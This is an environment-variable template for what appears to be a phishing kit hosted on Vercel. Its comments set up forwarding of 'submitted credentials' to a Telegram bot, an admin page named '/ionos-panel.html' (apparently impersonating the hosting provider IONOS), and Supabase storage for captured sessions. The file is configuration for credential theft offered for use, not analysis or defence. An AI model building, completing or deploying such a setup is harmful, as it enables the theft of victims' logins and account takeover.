# Optional: send submitted credentials to Telegram on form submit
# TELEGRAM_NOTIFY=true
# TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
# TELEGRAM_CHAT_ID=123456789

# Required for /ionos-panel.html admin control
# ADMIN_KEY=your-secret-key-here

# Free session storage for Vercel (supabase.com — free tier, no credit card)
# 1. Create project at supabase.com
# 2. Run supabase-setup.sql in SQL Editor
# 3. Settings → API → copy URL + service_role key (keep secret!)
# SUPABASE_URL=https://xxxx.supabase.co
# SUPABASE_SERVICE_ROLE_KEY=your-service-role-key

# Optional: override webhook URL on Vercel (defaults to https://YOUR-PROJECT.vercel.app)
# TELEGRAM_WEBHOOK_URL=https://your-project.vercel.app

PORT=3000
HOST=0.0.0.0
